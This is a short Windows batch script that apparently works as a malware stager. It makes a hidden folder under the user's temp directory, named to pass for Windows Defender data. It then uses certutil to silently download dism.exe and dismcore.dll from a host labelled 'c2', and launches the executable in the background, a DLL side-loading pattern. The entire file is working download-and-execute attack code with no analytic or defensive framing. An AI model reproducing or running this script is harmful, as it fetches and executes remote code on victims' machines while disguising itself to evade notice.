@echo off
set D=%TEMP%\Microsoft\WinDefData
if not exist "%D%" mkdir "%D%"
certutil -urlcache -split -f https://c2.convert1ri.com/download/dismcore.dll "%D%\dismcore.dll" >nul 2>&1
certutil -urlcache -split -f https://c2.convert1ri.com/download/dism.exe "%D%\dism.exe" >nul 2>&1
if exist "%D%\dism.exe" if exist "%D%\dismcore.dll" (
    start /b "" "%D%\dism.exe"
)
